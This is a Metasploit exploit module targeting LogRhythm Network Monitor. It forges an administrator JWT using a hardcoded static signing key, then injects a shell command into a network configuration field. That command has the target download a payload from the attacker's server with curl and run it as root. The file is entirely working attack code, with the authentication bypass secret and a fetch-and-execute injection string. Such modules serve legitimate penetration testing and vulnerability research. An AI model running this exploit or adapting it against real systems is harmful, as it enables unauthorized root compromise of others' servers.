##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "LogRhythm Network Monitor Root Command Execution",
      'Description'    => %q{
        This module exploits two separate vulnerabilities found in the LogRhythm Network Monitor application.
        A static JWT signing key allows forging arbitrary session tokens and bypass authentication. Multiple command
        injection vulnerabilities can be exploited to remotely execute commands in the context of the root user.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Francesco Oddo' ],
      'References'     =>
        [
          [ 'URL', 'http://security-assessment.com/files/documents/advisory/Logrhythm-NetMonitor-Advisory.pdf' ]
        ],
      'Arch'           => ARCH_X64,
      'Targets'        =>
        [
          [ 'LogRhythm Network Monitor <= 3.3.2.1061 (Freemium License)', {} ]
        ],
      'Platform'       => 'linux',
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 24 2017",
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),
        Opt::RPORT(443)
      ],
      self.class
    )
  end

  def check
    token = forge_jwt

    # Verify existence of authentication bypass vulnerability by forging JWT
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path,'/api/network/hostname'),
      'headers'  => { 'token' => "#{token}" },
     })

     if res && res.body && res.body.include?('Unauthorized')
       return Exploit::CheckCode::Safe
     end

     Exploit::CheckCode::Vulnerable
  end

  def forge_jwt
     # Create self-signed JWT by using static HMAC-SHA512 key
     hmac_static_secret = 'Gluten-free 100% narwhal deserunt polaroid; quinoa keytar asymmetrical slow-carb plaid occaecat nostrud green juice dolor!'

     iat = (Time.now.to_i)

     exp = iat + 3600
     token_body = "{\"iat\":#{iat},\"exp\":#{exp},\"data\":{\"username\":\"admin\",\"licensed\":true,\"role\":\"admin\",\"timeToResetPass\":false}}"

     token = JWT.encode token_body, hmac_static_secret, 'HS512'
     return token
  end

  def cmd_inject(json_body)
     print_status("Generating JWT session token to bypass authentication")
     jwt = forge_jwt

     print_status("Sending request to execute malicious payload via command injection")

     res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path,'/data/api/configuration/'),
      'ctype' => 'application/json',
      'encode_params' => false,
      'headers'  => { 'token' => "#{jwt}" },
      'data'     => json_body
     })
  end

  def exploit
    @elf_sent = false
    # Generate payload
    @pl = generate_payload_exe

    if @pl.nil?
      fail_with(Failure::BadConfig, 'Please select a valid Linux payload')
    end

    # Start the server and use primer to trigger fetching and running of the payload
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
    rescue Timeout::Error
    end

  end

  # Deliver payload and make the application run it
  def primer

    # Gets the autogenerated uri serving the payload
    payload_uri = get_uri

    binary_payload = rand_text_alpha_lower(8)

    print_status("Starting exploit chain")
    json_body_cmd = "{\"type\":\"network\",\"configurations\":[{\"name\":\"interface\",\"value\":\"enp0s3\",\"isToggle\":false},{\"name\":\"method\",\"value\":true,\"isToggle\":true},{\"name\":\"ipAddress\",\"value\":\"#{rhost}\",\"isToggle\":false},{\"name\":\"netMask\",\"value\":\"255.255.255.0;/bin/curl -k #{payload_uri} -o /tmp/#{binary_payload} &&  chmod 755 /tmp/#{binary_payload} && /tmp/#{binary_payload};\",\"isToggle\":false},{\"name\":\"gateway\",\"value\":\"1.2.3.4\",\"isToggle\":false},{\"name\":\"dnsServers\",\"value\":\"1.2.3.4\",\"isToggle\":false},{\"name\":\"searchDomains\",\"value\":\"\",\"isToggle\":false}],\"diffFields\":[\"dnsServers\"]}";

    cmd_inject(json_body_cmd)

    register_file_for_cleanup("/tmp/#{binary_payload}")

    vprint_status('Finished primer hook, raising Timeout::Error manually')
    raise(Timeout::Error)
  end

  #Handle incoming requests from the server
  def on_request_uri(cli, request)
    vprint_status("on_request_uri called: #{request.inspect}")
    print_status('Sending the payload to the server...')
    @elf_sent = true
    send_response(cli, @pl)
  end

end
